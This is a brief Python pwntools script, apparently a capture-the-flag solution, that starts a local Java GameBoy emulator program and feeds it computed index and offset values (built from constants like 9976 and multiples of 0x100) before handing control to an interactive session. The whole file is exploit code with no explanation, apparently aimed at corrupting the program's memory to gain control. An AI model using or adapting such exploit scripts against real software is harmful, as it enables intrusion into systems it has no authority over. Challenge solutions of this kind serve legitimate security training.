from pwn import *

p = process(["java", "com.garrettgu.oopboystripped.GameBoy"])


a = True
def g():
  global a

  a = not a
  return "a" if a else "b"

def i(idx, header=12):
  return str(idx * 4 + 9976 + 4 * 0x100 * (header - 11))

p.sendline("a 10001")

p.sendline(g() + " " + i(26))
p.sendline(g() + " " + i(88))
p.sendline(g() + " " + i(209))
p.sendline(g() + " " + i(209, 14))


p.sendline(g() + " 40000")

p.interactive()
